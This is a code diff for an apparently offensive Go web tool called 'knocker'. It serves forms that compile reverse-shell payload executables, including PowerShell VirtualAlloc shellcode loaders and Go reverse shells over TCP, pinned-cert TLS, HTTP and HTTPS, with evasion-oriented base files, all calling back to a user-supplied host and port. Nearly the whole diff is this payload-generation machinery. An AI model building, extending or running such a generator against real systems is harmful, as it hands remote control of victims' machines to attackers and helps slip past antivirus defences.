@@ -17,6 +17,8 @@ import (
 	"runtime"
 	"strings"
 	"time"
+
+	"github.com/gorilla/mux"
 )
 
 type baseframe struct {
@@ -29,22 +31,272 @@ type DownloadLink struct {
 
 var appconfig baseframe
 var dwnloadlink DownloadLink
-var knockertemplate *template.Template
+var knockertemplate, powvalloc, powrevhttp, powrev, gorevhttp, gorevhttps, gorev *template.Template
 var basepath, outpath, exepath, exeoutpath, downloadlink string
 
 func init() {
 	appconfig = baseframe{}
 	dwnloadlink = DownloadLink{}
 	knockertemplate = template.Must(template.ParseFiles("templates/knocker.html"))
+	powvalloc = template.Must(template.ParseFiles("templates/powvalloc.html"))
+	powrevhttp = template.Must(template.ParseFiles("templates/powrevhttp.html"))
+	powrev = template.Must(template.ParseFiles("templates/powrev.html"))
+	gorev = template.Must(template.ParseFiles("templates/gorev.html"))
+	gorevhttp = template.Must(template.ParseFiles("templates/gorevhttp.html"))
+	gorevhttps = template.Must(template.ParseFiles("templates/gorevhttps.html"))
 }
 func main() {
 	fmt.Println("knocker is ready ...")
 	fmt.Println("http://0.0.0.0:8085")
 	fillappconfig()
-	http.HandleFunc("/", index)
+	startserver()
+	/*http.HandleFunc("/", index)
 	http.Handle("/download/", http.StripPrefix("/download/", http.FileServer(http.Dir("download/"))))
 	http.Handle("/outfiles/", http.StripPrefix("/outfiles/", http.FileServer(http.Dir("outfiles/"))))
-	http.ListenAndServe(":8085", nil)
+	http.ListenAndServe(":8085", nil)*/
+}
+
+func fpowrev(httpw http.ResponseWriter, req *http.Request) {
+	if req.Method == "GET" {
+		err := powrev.Execute(httpw, nil)
+		if err != nil {
+			fmt.Println(err)
+		}
+	} else {
+		err := req.ParseForm()
+		saveas := req.Form.Get("saveas")
+		if strings.TrimSpace(saveas) == "" {
+			saveas = "noname"
+		}
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		rhost := req.Form.Get("rhost")
+		rport := req.Form.Get("rport")
+
+		createpsrevshellpayload(rhost, rport, saveas)
+		time.Sleep(5000 * time.Millisecond)
+		dwnloadlink.Link = "download/" + saveas + ".exe"
+		os.Remove("outfiles/rev.go")
+	}
+}
+
+func fpowvalloc(httpw http.ResponseWriter, req *http.Request) {
+	if req.Method == "GET" {
+		err := powvalloc.Execute(httpw, nil)
+		if err != nil {
+			fmt.Println(err)
+		}
+	} else {
+		err := req.ParseForm()
+		saveas := req.Form.Get("saveas")
+		if strings.TrimSpace(saveas) == "" {
+			saveas = "noname"
+		}
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		rhost := req.Form.Get("rhost")
+		rport := req.Form.Get("rport")
+		shellcode := req.Form.Get("shellcode")
+		createpsvirtualallocpayload(rhost, rport, shellcode, saveas)
+		time.Sleep(5000 * time.Millisecond)
+		dwnloadlink.Link = "download/" + saveas + ".exe"
+		os.Remove("outfiles/psvalloc.go")
+	}
+}
+
+func fpowrevhttp(httpw http.ResponseWriter, req *http.Request) {
+	if req.Method == "GET" {
+		err := powrevhttp.Execute(httpw, nil)
+		if err != nil {
+			fmt.Println(err)
+		}
+	} else {
+		err := req.ParseForm()
+		saveas := req.Form.Get("saveas")
+		if strings.TrimSpace(saveas) == "" {
+			saveas = "noname"
+		}
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		rhost := req.Form.Get("rhost")
+		rport := req.Form.Get("rport")
+		strtocompress := readandreplacefilecontent(rhost + ":" + rport)
+		//fmt.Println(strtocompress)
+		compressed := shellexeccompress(strtocompress)
+		//fmt.Println(compressed)
+		encstring := b64.StdEncoding.EncodeToString(compressed)
+		createencodedpsvirtualallocpayload(encstring, saveas)
+		time.Sleep(5000 * time.Millisecond)
+		dwnloadlink.Link = "download/" + saveas + ".exe"
+	}
+}
+
+func fgorevhttp(httpw http.ResponseWriter, req *http.Request) {
+	if req.Method == "GET" {
+		err := gorevhttp.Execute(httpw, nil)
+		if err != nil {
+			fmt.Println(err)
+		}
+	} else {
+		err := req.ParseForm()
+		saveas := req.Form.Get("saveas")
+		if strings.TrimSpace(saveas) == "" {
+			saveas = "noname"
+		}
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		rhost := req.Form.Get("rhost")
+		rport := req.Form.Get("rport")
+		basepath = filepath.FromSlash("basefiles/gorevhttp.go")
+		outpath = filepath.FromSlash("outfiles/gorevhttp.go")
+		exepath = filepath.FromSlash("download/" + saveas + ".exe")
+		exeoutpath = filepath.FromSlash("outfiles/gorevhttp.go")
+		creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, "", "", "")
+		dwnloadlink.Link = "download/" + saveas + ".exe"
+		time.Sleep(5000 * time.Millisecond)
+		os.Remove("outfiles/gorevhttp.go")
+	}
+}
+
+func fgorevhttps(httpw http.ResponseWriter, req *http.Request) {
+	if req.Method == "GET" {
+		err := gorevhttps.Execute(httpw, nil)
+		if err != nil {
+			fmt.Println(err)
+		}
+	} else {
+		err := req.ParseForm()
+		saveas := req.Form.Get("saveas")
+		if strings.TrimSpace(saveas) == "" {
+			saveas = "noname"
+		}
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		rhost := req.Form.Get("rhost")
+		rport := req.Form.Get("rport")
+		basepath = filepath.FromSlash("basefiles/gorevhttps.go")
+		outpath = filepath.FromSlash("outfiles/gorevhttps.go")
+		exepath = filepath.FromSlash("download/" + saveas + ".exe")
+		exeoutpath = filepath.FromSlash("outfiles/gorevhttps.go")
+		creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, "", "", "")
+		dwnloadlink.Link = "download/" + saveas + ".exe"
+		time.Sleep(5000 * time.Millisecond)
+		os.Remove("outfiles/gorevhttps.go")
+
+	}
+}
+
+func fgorev(httpw http.ResponseWriter, req *http.Request) {
+	if req.Method == "GET" {
+		err := gorev.Execute(httpw, nil)
+		if err != nil {
+			fmt.Println(err)
+		}
+	} else {
+		err := req.ParseForm()
+		saveas := req.Form.Get("saveas")
+		if strings.TrimSpace(saveas) == "" {
+			saveas = "noname"
+		}
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		rhost := req.Form.Get("rhost")
+		rport := req.Form.Get("rport")
+		var archtype string
+		shelltype := req.Form.Get("shelltype")
+		ostype := strings.ToLower(req.Form.Get("ostype"))
+		if req.Form.Get("archtype") == "32" {
+			archtype = "386"
+		} else {
+			archtype = "amd64"
+		}
+
+		fprint := req.Form.Get("fingerprint")
+
+		if ostype == "windows" {
+			exepath = filepath.FromSlash("download/" + saveas + ".exe")
+			downloadlink = "download/" + saveas + ".exe"
+		} else {
+			exepath = filepath.FromSlash("download/" + saveas)
+			downloadlink = "download/" + saveas
+		}
+
+		if shelltype == "TCP" {
+			basepath = filepath.FromSlash("basefiles/gorevcmd.go")
+			outpath = filepath.FromSlash("outfiles/gorevcmd.go")
+			exeoutpath = filepath.FromSlash("outfiles/gorevcmd.go")
+			createrevgoshell("manager/tcprev.go", "outfiles/tcprev.go", rport, false)
+		} else if shelltype == "TCP/TLS(PinnedCert)" {
+			basepath = filepath.FromSlash("basefiles/mask.go")
+			outpath = filepath.FromSlash("outfiles/mask.go")
+			exeoutpath = filepath.FromSlash("outfiles/mask.go")
+			createrevgoshell("manager/tcptlsrev.go", "outfiles/tcptlsrev.go", rport, true)
+		} else if shelltype == "HTTPS" {
+			basepath = filepath.FromSlash("basefiles/shadow.go")
+			outpath = filepath.FromSlash("outfiles/shadow.go")
+			exeoutpath = filepath.FromSlash("outfiles/shadow.go")
+			createrevgoshell("manager/httpsrev.go", "outfiles/httpsrev.go", rport, true)
+		}
+		creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, ostype, archtype, fprint)
+
+		time.Sleep(5000 * time.Millisecond)
+		dwnloadlink.Link = downloadlink
+		/*gofiles, err := filepath.Glob("outfiles/*.go")
+		if err != nil {
+			fmt.Println(err)
+		}
+		for _, f := range gofiles {
+			if err := os.Remove(f); err != nil {
+				fmt.Println(err)
+			}
+		}*/
+		//os.Remove("outfiles/gorevcmd.go")
+
+	}
+}
+
+func fknocker(httpw http.ResponseWriter, req *http.Request) {
+	if req.Method == "GET" {
+		err := knockertemplate.Execute(httpw, nil)
+		if err != nil {
+			fmt.Println(err)
+		}
+	}
+}
+
+func startserver() {
+	router := mux.NewRouter()
+	router.HandleFunc("/", fknocker)
+	router.HandleFunc("/powvalloc", fpowvalloc)
+	router.HandleFunc("/powrevhttp", fpowrevhttp)
+	router.HandleFunc("/powrev", fpowrev)
+	router.HandleFunc("/gorevhttp", fgorevhttp)
+	router.HandleFunc("/gorevhttps", fgorevhttps)
+	router.HandleFunc("/gorev", fgorev)
+	router.PathPrefix("/static/css/").Handler(http.StripPrefix("/static/css/", http.FileServer(http.Dir("static/css/"))))
+	router.PathPrefix("/download/").Handler(http.StripPrefix("/download/", http.FileServer(http.Dir("download/"))))
+	router.PathPrefix("/outfiles/").Handler(http.StripPrefix("/outfiles/", http.FileServer(http.Dir("outfiles/"))))
+
+	srv := &http.Server{
+		Handler: router,
+		Addr:    "0.0.0.0:8085",
+		// Good practice: enforce timeouts for servers you create!
+		WriteTimeout: 180 * time.Second,
+		ReadTimeout:  180 * time.Second,
+	}
+	srv.ListenAndServe()
 }
 
 func fillappconfig() {
@@ -594,7 +846,7 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, ostype, archtype, fprint)
 
 			//time.Sleep(5000 * time.Millisecond)
-			dwnloadlink.Link = downloadlink
+			/*dwnloadlink.Link = downloadlink
 			gofiles, err := filepath.Glob("outfiles/*.go")
 			if err != nil {
 				fmt.Println(err)
@@ -603,7 +855,7 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 				if err := os.Remove(f); err != nil {
 					fmt.Println(err)
 				}
-			}
+			}*/
 			//os.Remove("outfiles/gorevcmd.go")
 		} else if evadeoption == "ReverseHTTPs (HeapAlloc) (Go Lang)" {
 			fmt.Println("rhost =" + rhost)
